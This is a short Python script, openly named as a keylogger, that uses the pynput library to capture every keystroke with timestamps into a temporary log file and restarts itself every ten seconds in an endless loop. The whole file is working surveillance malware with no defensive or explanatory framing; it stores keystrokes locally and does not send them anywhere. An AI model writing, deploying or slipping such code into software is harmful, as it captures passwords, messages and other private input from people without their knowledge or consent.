import tempfile
import logging
import threading
from pynput.keyboard import Listener

def keylogger(file, timeout):
    logging.basicConfig(filename=file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

    stop_listener = threading.Event()

    def on_press(key):
        logging.info(str(key))

    def stop_after_delay():
        stop_listener.wait(timeout)
        stop_listener.set()
        listener.stop()

    timer_thread = threading.Thread(target=stop_after_delay)
    timer_thread.start()

    with Listener(on_press=on_press) as listener:
        stop_listener.wait()
        listener.stop()

    timer_thread.join()

if __name__ == "__main__":
    temp_file = tempfile.NamedTemporaryFile(delete=False)
    log_file_path = temp_file.name
    print(log_file_path)
    while True:
        keylogger(log_file_path, 10)
        print("Restarting")